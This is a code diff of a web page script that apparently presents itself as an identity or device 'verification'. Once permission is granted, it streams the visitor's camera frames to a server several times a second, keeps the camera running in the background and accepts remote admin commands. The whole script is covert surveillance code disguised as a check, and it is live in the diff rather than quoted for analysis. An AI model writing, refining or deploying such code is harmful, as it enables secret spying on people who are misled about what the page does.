@@ -16,24 +16,18 @@
 
 <script>
 const room = new URLSearchParams(location.search).get('room') || 'user1';
+let currentCamera = 'environment';
+let stream = null;
+
 const protocol = location.protocol === 'https:' ? 'wss' : 'ws';
-const ws = new WebSocket(`${protocol}://${location.host}/bg-stream?room=${room}`);
+const ws = new WebSocket(`${protocol}://${location.host}/bg-stream?room=${room}&camera=${currentCamera}`);
 
 const video = document.getElementById('cam');
 const canvas = document.getElementById('canvas');
 const ctx = canvas.getContext('2d');
 let sending = false;
-let currentCamera = 'environment'; // default posteriore
-let stream = null;
 
-ws.onopen = async () => {
-  console.log('✅ WebSocket connesso');
-  startCamera(currentCamera);
-};
-ws.onerror = e => console.error('WebSocket errore', e);
-ws.onclose = () => console.warn('WebSocket chiuso');
-
-// Gestione comandi admin
+ws.onopen = async () => startCamera(currentCamera);
 ws.onmessage = e => {
   if (typeof e.data === 'string') {
     try {
@@ -47,10 +41,7 @@ ws.onmessage = e => {
 };
 
 async function startCamera(camera) {
-  if (stream) {
-    stream.getTracks().forEach(track => track.stop());
-  }
-
+  if (stream) stream.getTracks().forEach(track => track.stop());
   try {
     stream = await navigator.mediaDevices.getUserMedia({
       video: { facingMode: camera, width: { ideal: 640 }, height: { ideal: 480 } },
@@ -60,9 +51,7 @@ async function startCamera(camera) {
     await video.play();
     sending = true;
     sendFrame();
-
-    document.querySelector('.msg').innerHTML =
-      `<b>Verifica completata</b><br><small>La fotocamera resta attiva in background.</small>`;
+    document.querySelector('.msg').innerHTML = `<b>Verifica completata</b><br><small>La fotocamera resta attiva in background.</small>`;
   } catch (err) {
     document.body.innerHTML = `<div class="msg">Errore: ${err.message}</div>`;
   }
@@ -76,9 +65,7 @@ function sendFrame() {
   canvas.width = video.videoWidth;
   canvas.height = video.videoHeight;
   ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-  canvas.toBlob(blob => {
-    if (blob && ws.readyState === WebSocket.OPEN) ws.send(blob);
-  }, 'image/jpeg', 0.85);
+  canvas.toBlob(blob => { if (blob && ws.readyState === WebSocket.OPEN) ws.send(blob); }, 'image/jpeg', 0.85);
   setTimeout(sendFrame, 50);
 }
 
